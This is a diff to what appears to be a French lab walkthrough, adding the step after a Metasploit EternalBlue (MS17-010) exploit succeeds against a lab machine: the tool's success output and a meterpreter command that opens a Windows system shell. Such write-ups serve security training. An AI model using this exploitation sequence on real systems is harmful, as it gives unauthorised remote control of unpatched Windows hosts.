@@ -255,3 +255,16 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [+] 10.10.214.31:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 [+] 10.10.214.31:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 ```
+
+Félicitations, vous avez pénétré la machine cible :raised_hands:
+
+- Lancez un shell windows
+
+```
+meterpreter > shell
+Process 2184 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>
